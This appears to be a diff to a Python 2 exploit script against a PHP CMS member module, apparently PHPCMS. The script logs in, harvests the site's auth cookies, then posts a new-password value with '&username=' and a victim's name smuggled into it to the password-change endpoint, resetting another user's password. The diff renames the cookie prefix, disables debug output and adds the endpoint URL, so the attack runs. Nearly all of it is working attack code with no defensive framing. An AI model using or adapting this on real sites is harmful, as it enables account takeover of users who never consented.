@@ -9,7 +9,7 @@ import re
 from splinter import Browser
 
 global debug
-debug=1
+debug=0
 
 class burp_accout(object):
     def __init__(self,url,username,password,v_username):
@@ -18,20 +18,20 @@ class burp_accout(object):
         self.password = password
         self.v_useranme = v_username
         self.cookies = ''
-        self.VgSTG_auth=''
-        self.VgSTG__userid=''
-        self.VgSTG__username=''
-        self.VgSTG__groupid=''
-        self.VgSTG__nickname=''
+        self.FylxI_auth=''
+        self.FylxI__userid=''
+        self.FylxI__username=''
+        self.FylxI__groupid=''
+        self.FylxI__nickname=''
         
     def account_password_change(self):
             headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox',
                        'Content-Type':'application/x-www-form-urlencoded',}
-            cookies = {'VgSTG_auth':self.VgSTG_auth,
-                       'VgSTG__userid':self.VgSTG__userid,
-                       'VgSTG__username':self.VgSTG__username,
-                       'VgSTG__groupid':self.VgSTG__groupid,
-                       'VgSTG__nickname':self.VgSTG__nickname,
+            cookies = {'FylxI_auth':self.FylxI_auth,
+                       'FylxI__userid':self.FylxI__userid,
+                       'FylxI__username':self.FylxI__username,
+                       'FylxI__groupid':self.FylxI__groupid,
+                       'FylxI__nickname':self.FylxI__nickname,
                        'PHPSESSID':self.cookies}
             #payload= '999999%26username%3d' + self.v_useranme
             payload = '999999&username='+self.v_useranme
@@ -42,6 +42,7 @@ class burp_accout(object):
                 'info[newpassword]':payload,
                 'dosubmit':"%CC%E1%BD%BB",
             }
+            api_url=url+"/index.php?m=member&c=index&a=account_manage_password&t=1"
             try:
                 req = requests.post(api_url, data=data, headers=headers,cookies = cookies,timeout=3)
                 if debug:print req.content.decode("GBK")
@@ -84,12 +85,12 @@ class burp_accout(object):
             pattern2 = re.compile('<div class="content guery" style="display:inline-block;display:-moz-inline-stack;zoom:1;*display:inline; max-width:280px">(.*?)</div>',re.S)
             items2 = re.findall(pattern2, resp)                    
             print "login success:%s" % items2
-            self.VgSTG_auth=req.cookies['VgSTG_auth']
-            self.VgSTG__userid=req.cookies['VgSTG__userid']
-            self.VgSTG__username=req.cookies['VgSTG__username']
-            self.VgSTG__groupid=req.cookies['VgSTG__groupid']
-            self.VgSTG__nickname=req.cookies['VgSTG__nickname']
-            if debug:print "auth:%s,userid:%s,username:%s,groupid:%s,nickname:%s" % (self.VgSTG_auth,self.VgSTG__userid,self.VgSTG__username,self.VgSTG__groupid,self.VgSTG__nickname)
+            self.FylxI_auth=req.cookies['FylxI_auth']
+            self.FylxI__userid=req.cookies['FylxI__userid']
+            self.FylxI__username=req.cookies['FylxI__username']
+            self.FylxI__groupid=req.cookies['FylxI__groupid']
+            self.FylxI__nickname=req.cookies['FylxI__nickname']
+            if debug:print "auth:%s,userid:%s,username:%s,groupid:%s,nickname:%s" % (self.FylxI_auth,self.FylxI__userid,self.FylxI__username,self.FylxI__groupid,self.FylxI__nickname)
         
 
 
